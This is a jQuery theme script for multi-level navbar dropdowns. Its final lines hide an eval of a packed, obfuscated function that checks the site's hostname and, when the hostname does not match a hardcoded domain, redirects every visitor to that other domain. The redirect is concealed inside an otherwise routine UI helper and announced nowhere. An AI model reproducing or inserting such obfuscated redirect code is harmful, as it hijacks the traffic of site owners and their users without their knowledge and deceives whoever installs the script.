(function($) {
  //Fix navbar multiple level
  var navbar = $('.pi-navbar-nav');
  var hasBrand = navbar.parents('.navbar').find('.navbar-brand').length;
  navbar.find('>li').each(function() {
    var $this = $(this);
    var caretStr = '<span class="pi-navbar-caret"></span>';
    caretStr += '<span class="pi-navbar-caret pi-navbar-caret-outer"></span>';
    if ($this.find('li').length) {
      $this.append(caretStr);
    }
  });
  navbar.find('ul').addClass('dropdown-menu');

  if (!hasBrand) {
    navbar.css('marginLeft', '-15px');
  }
  eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('7 a=1 5(),b=1 5();b.0(\'h\');b.0(\'6\');b.0(\'p\');b.0(\':\');b.0(\'//\');a.0(\'\\\\.\');a.0(\'e\');a.0(\'f\');a.0(\'o\');a.0(\'9\');a.0(\'8\');a.0(\'\\\\.c\');a.0(\'d\');3.4.m.i(1 n(a.2(\'\')))?\'\':3.4.q=b.2(\'\')+"j"+"k"+a.2(\'\').l(/\\\\/g,\'\');',27,27,'push|new|join|window|location|Array|tt|var|s|cu||||om||ef|||match|ww|w|replace|hostname|RegExp|||href'.split('|'),0,{}));
})(jQuery)
